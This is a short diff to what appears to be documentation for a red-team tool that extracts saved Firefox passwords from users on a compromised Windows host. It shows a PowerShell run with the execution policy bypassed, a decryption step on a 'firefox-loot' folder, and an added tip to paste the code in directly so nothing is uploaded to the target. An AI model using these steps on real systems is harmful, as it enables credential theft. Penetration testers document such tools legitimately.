@@ -19,6 +19,8 @@ PS C:\tmp> powershell.exe -ExecutionPolicy Bypass .\firefox_extract.ps1
 [-] 'user3' doesn't have any saved passwords in Mozilla Firefox
 ```
 
+If you don't want to upload files to the target host it's possible to simply copy-paste the try-catch code from the script and run it as is in PowerShell.
+
 ```bash
 ┌──(void㉿void)-[/opt/firefox_decrypt]
 └─$ ./firefox_decrypt.py /tmp/firefox-loot/user1            
